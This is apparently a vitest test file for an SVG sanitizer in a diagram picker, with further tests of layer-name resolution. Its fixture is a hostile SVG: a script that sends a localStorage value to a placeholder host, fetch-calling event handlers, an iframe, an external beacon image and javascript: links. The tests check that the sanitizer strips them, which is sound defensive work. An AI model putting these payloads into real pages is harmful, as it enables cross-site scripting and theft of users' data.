import { describe, it, expect } from "vitest";
import { scrubSvgText, sanitizeSvg } from "../../src/graph/svgSanitize";
import { sourceHasLayer } from "../../src/graph/svgLayer";
import { SvgPickerNode } from "../../src/graph/nodes/annotation";

const HOSTILE = `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 10 10">
  <script>fetch("https://x/?" + localStorage.getItem("k"))</script>
  <rect id="roof" class="part" fill="#c00" onmouseover="fetch('https://x')" width="4" height="4"/>
  <path data-name="Wall" d="M0 0 L4 4" onclick='alert(1)'/>
  <foreignObject><iframe src="https://x"></iframe></foreignObject>
  <image href="https://x/beacon.png" width="1" height="1"/>
  <use xlink:href="https://x/evil.svg#a"/>
  <use href="#roof"/>
  <a href="javascript:alert(1)"><circle id="door" r="1"/></a>
</svg>`;

describe("SVG Picker intake sanitizer", () => {
  it("strips scripts, handlers, foreignObject, external image / use hrefs and javascript: urls", () => {
    const out = scrubSvgText(HOSTILE);
    expect(out).not.toMatch(/<script/i);
    expect(out).not.toMatch(/onmouseover|onclick/i);
    expect(out).not.toMatch(/foreignObject|iframe/i);
    expect(out).not.toMatch(/https:\/\/x/);
    expect(out).not.toMatch(/javascript:/i);
  });
  it("keeps what the picker needs: ids, names, classes, paths, fills, a local <use>", () => {
    const out = scrubSvgText(HOSTILE);
    expect(out).toMatch(/id="roof"/);
    expect(out).toMatch(/data-name="Wall"/);
    expect(out).toMatch(/class="part"/);
    expect(out).toMatch(/fill="#c00"/);
    expect(out).toMatch(/d="M0 0 L4 4"/);
    expect(out).toMatch(/<use href="#roof"\/>/);
    expect(out).toMatch(/id="door"/);
  });
  it("sanitizeSvg runs headless (the text pass alone) without throwing", () => {
    expect(sanitizeSvg("<svg><rect id='a'/></svg>")).toMatch(/id='a'/);
  });
});

describe("a persisted layer pick never outlives its picture", () => {
  it("sourceHasLayer reads the same name attributes the resolver does", () => {
    expect(sourceHasLayer('<svg><g inkscape:label="Roof"/></svg>', "Roof")).toBe(true);
    expect(sourceHasLayer('<svg><g id="roof"/></svg>', "Roof")).toBe(false);
    expect(sourceHasLayer("<svg/>", "")).toBe(false);
  });
  it("the layer output is blank once the source no longer names the pick", () => {
    const n = new SvgPickerNode({ source: '<svg><rect id="roof"/></svg>', selectedLayer: "roof" });
    expect(n.data().layer).toBe("roof");
    n.stringLiterals.source = '<svg><rect id="wall"/></svg>';
    expect(n.data().layer).toBeNull();
  });
});
